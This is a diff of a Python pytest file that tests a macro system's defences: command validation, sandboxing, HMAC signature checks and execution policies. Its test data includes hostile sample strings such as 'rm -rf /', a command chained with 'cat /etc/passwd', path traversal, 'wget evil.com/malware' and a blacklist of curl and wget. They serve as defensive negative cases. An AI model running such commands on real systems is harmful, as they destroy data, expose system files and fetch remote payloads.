@@ -1,14 +1,19 @@
 """
-from typing import Any
 Comprehensive tests for macro security and injection prevention
 Tests command validation, sandboxing, and signature verification
 """
 
+import hashlib
+import hmac
 import json
 import os
+import shlex
+import subprocess
+import tempfile
 import time
 from datetime import datetime, timedelta
-from unittest.mock import patch
+from pathlib import Path
+from unittest.mock import MagicMock, call, patch
 
 import pytest
 
@@ -26,10 +31,10 @@ class TestCommandValidator:
     """Test command validation for security"""
 
     @pytest.fixture
-    def validator(self) -> None:
+    def validator(self):
         return CommandValidator()
 
-    def test_block_dangerous_commands(self, validator) -> None:
+    def test_block_dangerous_commands(self, validator):
         """Test blocking of dangerous system commands"""
         dangerous_commands = [
             "rm -rf /",
@@ -58,7 +63,7 @@ class TestCommandValidator:
                 for v in result.violations
             )
 
-    def test_detect_shell_injection(self, validator) -> None:
+    def test_detect_shell_injection(self, validator):
         """Test detection of shell injection attempts"""
         injection_attempts = [
             "img convert file.jpg; cat /etc/passwd",
@@ -84,7 +89,7 @@ class TestCommandValidator:
                 for v in result.violations
             )
 
-    def test_detect_path_traversal(self, validator) -> None:
+    def test_detect_path_traversal(self, validator):
         """Test detection of path traversal attempts"""
         traversal_attempts = [
             "img convert ../../../etc/passwd",
@@ -106,7 +111,7 @@ class TestCommandValidator:
                 assert result.warnings is not None
                 assert len(result.warnings) > 0
 
-    def test_detect_command_chaining(self, validator) -> None:
+    def test_detect_command_chaining(self, validator):
         """Test detection of command chaining"""
         chained_commands = [
             "img convert a.jpg; img convert b.jpg; img convert c.jpg",
@@ -126,7 +131,7 @@ class TestCommandValidator:
                     for w in result.warnings
                 )
 
-    def test_validate_safe_commands(self, validator) -> None:
+    def test_validate_safe_commands(self, validator):
         """Test that safe commands pass validation"""
         safe_commands = [
             "img convert photo.jpg -f webp",
@@ -143,7 +148,7 @@ class TestCommandValidator:
             assert result.is_safe is True
             assert len(result.violations) == 0
 
-    def test_environment_variable_injection(self, validator) -> None:
+    def test_environment_variable_injection(self, validator):
         """Test detection of environment variable injection"""
         env_injections = [
             "img convert $PATH.jpg",
@@ -159,7 +164,7 @@ class TestCommandValidator:
             if "$" in injection or "%" in injection or "=" in injection:
                 assert result.warnings is not None or result.is_safe is False
 
-    def test_network_command_detection(self, validator) -> None:
+    def test_network_command_detection(self, validator):
         """Test detection of network-related commands"""
         network_commands = [
             "img convert file.jpg; wget evil.com/malware",
@@ -178,7 +183,7 @@ class TestCommandValidator:
                 for v in result.violations
             )
 
-    def test_file_operation_detection(self, validator) -> None:
+    def test_file_operation_detection(self, validator):
         """Test detection of dangerous file operations"""
         file_operations = [
             "img convert file.jpg; chmod 777 /tmp/file",
@@ -197,17 +202,17 @@ class TestMacroSandbox:
     """Test macro execution sandboxing"""
 
     @pytest.fixture
-    def sandbox(self) -> None:
+    def sandbox(self):
         return MacroSandbox()
 
-    def test_sandbox_initialization(self, sandbox) -> None:
+    def test_sandbox_initialization(self, sandbox):
         """Test sandbox initializes with restrictions"""
         assert sandbox.max_execution_time > 0
         assert sandbox.max_memory_mb > 0
         assert sandbox.allowed_paths is not None
         assert sandbox.blocked_syscalls is not None
 
-    def test_sandbox_file_access_restrictions(self, sandbox, tmp_path) -> None:
+    def test_sandbox_file_access_restrictions(self, sandbox, tmp_path):
         """Test file access restrictions in sandbox"""
         # Create test structure
         allowed_dir = tmp_path / "allowed"
@@ -231,7 +236,7 @@ class TestMacroSandbox:
         assert sandbox.check_file_access("/etc/passwd") is False
         assert sandbox.check_file_access("C:\\Windows\\System32\\config") is False
 
-    def test_sandbox_network_blocking(self, sandbox) -> None:
+    def test_sandbox_network_blocking(self, sandbox):
         """Test network access blocking in sandbox"""
         # Mock network operations
         with patch("socket.socket") as mock_socket:
@@ -240,11 +245,11 @@ class TestMacroSandbox:
             with pytest.raises(PermissionError):
                 sandbox.execute_with_restrictions(lambda: __import__("socket").socket())
 
-    def test_sandbox_resource_limits(self, sandbox) -> None:
+    def test_sandbox_resource_limits(self, sandbox):
         """Test resource limit enforcement"""
 
         # Test memory limit
-        def memory_hog() -> None:
+        def memory_hog():
             data = []
             for _ in range(1000000):
                 data.append("x" * 1024)  # Try to allocate lots of memory
@@ -256,18 +261,18 @@ class TestMacroSandbox:
             with pytest.raises(MemoryError):
                 sandbox.execute_with_restrictions(memory_hog)
 
-    def test_sandbox_timeout_enforcement(self, sandbox) -> None:
+    def test_sandbox_timeout_enforcement(self, sandbox):
         """Test execution timeout enforcement"""
         sandbox.max_execution_time = 1  # 1 second timeout
 
-        def infinite_loop() -> None:
+        def infinite_loop():
             while True:
                 time.sleep(0.1)
 
         with pytest.raises(TimeoutError):
             sandbox.execute_with_timeout(infinite_loop)
 
-    def test_sandbox_subprocess_restrictions(self, sandbox) -> None:
+    def test_sandbox_subprocess_restrictions(self, sandbox):
         """Test subprocess execution restrictions"""
         # Should block subprocess creation
         dangerous_commands = [
@@ -281,7 +286,7 @@ class TestMacroSandbox:
             with pytest.raises((PermissionError, OSError)):
                 sandbox.execute_subprocess(cmd)
 
-    def test_sandbox_escape_prevention(self, sandbox) -> None:
+    def test_sandbox_escape_prevention(self, sandbox):
         """Test prevention of sandbox escape attempts"""
         escape_attempts = [
             # Python escape attempts
@@ -298,7 +303,7 @@ class TestMacroSandbox:
             with pytest.raises((PermissionError, ImportError, OSError)):
                 sandbox.execute_with_restrictions(attempt)
 
-    def test_sandbox_safe_execution(self, sandbox) -> None:
+    def test_sandbox_safe_execution(self, sandbox):
         """Test that safe operations work in sandbox"""
         # Safe operations should work
         safe_ops = [
@@ -317,11 +322,11 @@ class TestSignatureVerifier:
     """Test macro signature verification"""
 
     @pytest.fixture
-    def verifier(self) -> None:
+    def verifier(self):
         secret_key = b"test_secret_key_for_hmac"
         return SignatureVerifier(secret_key)
 
-    def test_signature_generation(self, verifier) -> None:
+    def test_signature_generation(self, verifier):
         """Test signature generation for macros"""
         macro_data = {
             "name": "test_macro",
@@ -335,7 +340,7 @@ class TestSignatureVerifier:
         assert len(signature) == 64  # SHA256 hex digest length
         assert all(c in "0123456789abcdef" for c in signature)
 
-    def test_signature_verification(self, verifier) -> None:
+    def test_signature_verification(self, verifier):
         """Test signature verification"""
         macro_data = {"name": "test_macro", "commands": ["img convert file.jpg"]}
 
@@ -349,7 +354,7 @@ class TestSignatureVerifier:
         macro_data["commands"].append("evil command")
         assert verifier.verify(macro_data, signature) is False
 
-    def test_signature_tampering_detection(self, verifier) -> None:
+    def test_signature_tampering_detection(self, verifier):
         """Test detection of tampered signatures"""
         macro_data = {"name": "macro", "commands": ["cmd"]}
         signature = verifier.sign(macro_data)
@@ -367,7 +372,7 @@ class TestSignatureVerifier:
         for tampered in tampered_signatures:
             assert verifier.verify(macro_data, tampered) is False
 
-    def test_signature_replay_prevention(self, verifier) -> None:
+    def test_signature_replay_prevention(self, verifier):
         """Test prevention of signature replay attacks"""
         macro_data = {
             "name": "macro",
@@ -393,10 +398,10 @@ class TestExecutionPolicy:
     """Test macro execution policies"""
 
     @pytest.fixture
-    def policy(self) -> None:
+    def policy(self):
         return ExecutionPolicy()
 
-    def test_policy_levels(self, policy) -> None:
+    def test_policy_levels(self, policy):
         """Test different policy security levels"""
         assert policy.UNRESTRICTED < policy.RESTRICTED
         assert policy.RESTRICTED < policy.PARANOID
@@ -408,7 +413,7 @@ class TestExecutionPolicy:
             policy.PARANOID,
         ]
 
-    def test_policy_unrestricted(self, policy) -> None:
+    def test_policy_unrestricted(self, policy):
         """Test unrestricted execution policy"""
         policy.set_level(policy.UNRESTRICTED)
 
@@ -419,7 +424,7 @@ class TestExecutionPolicy:
         # But still block extremely dangerous ones
         assert policy.is_allowed("rm -rf /") is False
 
-    def test_policy_restricted(self, policy) -> None:
+    def test_policy_restricted(self, policy):
         """Test restricted execution policy"""
         policy.set_level(policy.RESTRICTED)
 
@@ -430,7 +435,7 @@ class TestExecutionPolicy:
         assert policy.is_allowed("ls -la") is False
         assert policy.is_allowed("cat file.txt") is False
 
-    def test_policy_paranoid(self, policy) -> None:
+    def test_policy_paranoid(self, policy):
         """Test paranoid execution policy"""
         policy.set_level(policy.PARANOID)
 
@@ -442,7 +447,7 @@ class TestExecutionPolicy:
         assert policy.is_allowed("img batch process") is False
         assert policy.is_allowed("anything else") is False
 
-    def test_policy_command_whitelist(self, policy) -> None:
+    def test_policy_command_whitelist(self, policy):
         """Test command whitelisting"""
         policy.whitelist = ["img convert", "img batch", "img optimize"]
 
@@ -450,7 +455,7 @@ class TestExecutionPolicy:
         assert policy.is_command_whitelisted("img batch process") is True
         assert policy.is_command_whitelisted("rm -rf /") is False
 
-    def test_policy_command_blacklist(self, policy) -> None:
+    def test_policy_command_blacklist(self, policy):
         """Test command blacklisting"""
         policy.blacklist = ["rm", "del", "format", "dd", "curl", "wget"]
 
@@ -463,11 +468,11 @@ class TestMacroManager:
     """Test MacroManager security features"""
 
     @pytest.fixture
-    def manager(self, tmp_path) -> None:
+    def manager(self, tmp_path):
         return MacroManager(storage_dir=tmp_path / "macros")
 
     @pytest.fixture
-    def sample_macro(self) -> None:
+    def sample_macro(self):
         return Macro(
             name="convert_to_webp",
             description="Convert images to WebP",
@@ -477,7 +482,7 @@ class TestMacroManager:
             approved=False,
         )
 
-    def test_macro_approval_required(self, manager, sample_macro) -> None:
+    def test_macro_approval_required(self, manager, sample_macro):
         """Test that macros require approval before execution"""
         # Save unapproved macro
         manager.save_macro(sample_macro)
@@ -488,7 +493,7 @@ class TestMacroManager:
                 sample_macro.name, {"input": "test.jpg", "output": "test.webp"}
             )
 
-    def test_macro_parameter_sanitization(self, manager, sample_macro) -> None:
+    def test_macro_parameter_sanitization(self, manager, sample_macro):
         """Test parameter sanitization in macros"""
         sample_macro.approved = True
         manager.save_macro(sample_macro)
@@ -502,7 +507,7 @@ class TestMacroManager:
         with pytest.raises(ValueError, match="Invalid parameter"):
             manager.execute_macro(sample_macro.name, malicious_params)
 
-    def test_macro_command_validation(self, manager) -> None:
+    def test_macro_command_validation(self, manager):
         """Test command validation when creating macros"""
         # Try to create macro with dangerous commands
         dangerous_macro = Macro(
@@ -517,7 +522,7 @@ class TestMacroManager:
         with pytest.raises(ValueError, match="contains dangerous commands"):
             manager.save_macro(dangerous_macro)
 
-    def test_macro_storage_security(self, manager, tmp_path) -> None:
+    def test_macro_storage_security(self, manager, tmp_path):
         """Test secure storage of macros"""
         macro = Macro(
             name="test", commands=["img convert {{file}}"], parameters=["file"]
@@ -535,7 +540,7 @@ class TestMacroManager:
             mode = stat_info.st_mode & 0o777
             assert mode == 0o600  # Read/write for owner only
 
-    def test_macro_signature_verification(self, manager, sample_macro) -> None:
+    def test_macro_signature_verification(self, manager, sample_macro):
         """Test signature verification on macro loading"""
         sample_macro.approved = True
         manager.save_macro(sample_macro)
@@ -550,7 +555,7 @@ class TestMacroManager:
         with pytest.raises(ValueError, match="signature"):
             manager.load_macro(sample_macro.name)
 
-    def test_macro_execution_logging(self, manager, sample_macro) -> None:
+    def test_macro_execution_logging(self, manager, sample_macro):
         """Test that macro executions are logged for audit"""
         sample_macro.approved = True
         manager.save_macro(sample_macro)
@@ -565,7 +570,7 @@ class TestMacroManager:
 
             mock_log.assert_called()
 
-    def test_macro_recursive_expansion_limit(self, manager) -> None:
+    def test_macro_recursive_expansion_limit(self, manager):
         """Test prevention of recursive macro expansion"""
         # Create macros that reference each other
         macro1 = Macro(name="macro1", commands=["{{macro:macro2}}"], approved=True)
@@ -583,7 +588,7 @@ class TestMacroManager:
         with pytest.raises(RecursionError):
             manager.execute_macro("macro1", {})
 
-    def test_macro_dry_run_mode(self, manager, sample_macro) -> None:
+    def test_macro_dry_run_mode(self, manager, sample_macro):
         """Test dry-run execution of macros"""
         sample_macro.approved = True
         manager.save_macro(sample_macro)
@@ -604,7 +609,7 @@ class TestMacroInjectionE2E:
     """End-to-end macro injection prevention tests"""
 
     @pytest.fixture
-    def full_system(self, tmp_path) -> None:
+    def full_system(self, tmp_path):
         """Set up full macro system"""
         manager = MacroManager(storage_dir=tmp_path / "macros")
         validator = CommandValidator()
@@ -620,7 +625,7 @@ class TestMacroInjectionE2E:
             "policy": policy,
         }
 
-    def test_complete_security_workflow(self, full_system, tmp_path) -> None:
+    def test_complete_security_workflow(self, full_system, tmp_path):
         """Test complete security workflow for macro execution"""
         manager = full_system["manager"]
 
@@ -653,7 +658,7 @@ class TestMacroInjectionE2E:
 
             mock_exec.assert_called_once()
 
-    def test_injection_attempt_blocked_at_multiple_levels(self, full_system) -> None:
+    def test_injection_attempt_blocked_at_multiple_levels(self, full_system):
         """Test that injection attempts are blocked at multiple security levels"""
         manager = full_system["manager"]
 
@@ -684,7 +689,7 @@ class TestMacroInjectionE2E:
         with pytest.raises((PermissionError, OSError)):
             sandbox.execute_subprocess(["cat", "/etc/passwd"])
 
-    def test_comprehensive_injection_vectors(self, full_system) -> None:
+    def test_comprehensive_injection_vectors(self, full_system):
         """Test comprehensive set of injection vectors"""
         manager = full_system["manager"]
 
@@ -728,7 +733,7 @@ class TestMacroInjectionE2E:
             with pytest.raises((ValueError, PermissionError)):
                 manager.execute_macro("test", vector)
 
-    def test_security_audit_trail(self, full_system, tmp_path) -> None:
+    def test_security_audit_trail(self, full_system, tmp_path):
         """Test that security events are properly logged"""
         manager = full_system["manager"]
 
